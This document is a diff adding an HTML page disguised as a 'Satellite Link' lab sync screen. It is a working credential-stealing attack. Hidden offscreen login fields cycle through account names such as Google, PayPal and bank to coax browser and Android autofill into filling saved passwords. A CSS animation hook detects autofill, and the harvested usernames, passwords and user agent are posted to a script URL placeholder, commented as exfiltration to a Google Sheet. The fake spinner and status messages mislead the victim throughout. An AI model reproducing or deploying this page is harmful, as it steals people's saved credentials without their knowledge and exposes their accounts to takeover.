@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Satellite Node | Secure Sync</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0b0e14; color: #00ff41; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        #lab-container { text-align: center; border: 1px solid #00ff41; padding: 40px; border-radius: 8px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); width: 80%; max-width: 400px; }
+        .spinner { border: 4px solid rgba(0, 255, 65, 0.1); border-left: 4px solid #00ff41; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        button { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 10px 20px; cursor: pointer; font-weight: bold; text-transform: uppercase; margin-top: 20px; transition: 0.3s; }
+        button:hover { background: #00ff41; color: #0b0e14; }
+        
+        /* The Invisible Trap: Keep fields 'visible' to browser but hidden from human eye */
+        #trap-zone { position: absolute; top: -1000px; left: -1000px; opacity: 0.01; }
+        
+        /* Detection Trick: CSS Animation triggers when autofill happens */
+        @keyframes onAutoFillStart { from { } to { } }
+        input:-webkit-autofill { animation-name: onAutoFillStart; transition: background-color 50000s ease-in-out 0s; }
+    </style>
+</head>
+<body>
+
+<div id="lab-container">
+    <div id="ui-initial">
+        <h2>SATELLITE LINK</h2>
+        <p>Lab ID: 0xFF92-Android</p>
+        <button onclick="startLabSync()">Initialize Sync</button>
+    </div>
+
+    <div id="ui-processing" style="display:none;">
+        <div class="spinner"></div>
+        <h3 id="status">Scanning Local Node...</h3>
+        <p id="sub-status">Checking encrypted handshake...</p>
+    </div>
+</div>
+
+<div id="trap-zone">
+    <form id="exfilForm">
+        <input type="text" id="u" name="login" autocomplete="username">
+        <input type="password" id="p" name="password" autocomplete="current-password">
+    </form>
+</div>
+
+<script>
+    // Replace with your Google Apps Script URL
+    const GATEWAY_URL = 'YOUR_GOOGLE_SCRIPT_URL';
+    
+    // Most popular account contexts to trigger different autofill suggestions
+    const contexts = ['google', 'facebook', 'amazon', 'netflix', 'paypal', 'bank', 'outlook'];
+    let step = 0;
+
+    function startLabSync() {
+        document.getElementById('ui-initial').style.display = 'none';
+        document.getElementById('ui-processing').style.display = 'block';
+        runCycle();
+    }
+
+    function runCycle() {
+        if (step >= contexts.length) {
+            document.getElementById('status').innerText = "SYNC COMPLETE";
+            document.getElementById('sub-status').innerText = "All packets transferred.";
+            return;
+        }
+
+        let currentContext = contexts[step];
+        document.getElementById('status').innerText = `Syncing: ${currentContext.toUpperCase()}`;
+        
+        // Trick: Changing the name/id can sometimes force Chrome to re-evaluate autofill
+        document.getElementById('u').name = `${currentContext}_id`;
+        document.getElementById('p').name = `${currentContext}_pass`;
+
+        // Wait for user to interact with the "Autofill" prompt Android usually shows
+        setTimeout(() => {
+            harvest();
+            step++;
+            runCycle();
+        }, 3500); // 3.5 seconds per context to give the user time to click 'Yes' on OS prompts
+    }
+
+    function harvest() {
+        const u = document.getElementById('u').value;
+        const p = document.getElementById('p').value;
+
+        if (u && p) {
+            const payload = {
+                account: contexts[step],
+                user: u,
+                pass: p,
+                agent: navigator.userAgent
+            };
+
+            // Non-blocking exfiltration to your Google Sheet
+            fetch(GATEWAY_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(payload)
+            });
+            
+            // Clear fields for the next attempt
+            document.getElementById('u').value = "";
+            document.getElementById('p').value = "";
+        }
+    }
+
+    // Advanced Detection: If autofill happens instantly, harvest instantly
+    document.getElementById('p').addEventListener('animationstart', (e) => {
+        if (e.animationName === 'onAutoFillStart') {
+            harvest();
+        }
+    });
+</script>
+
+</body>
+</html>
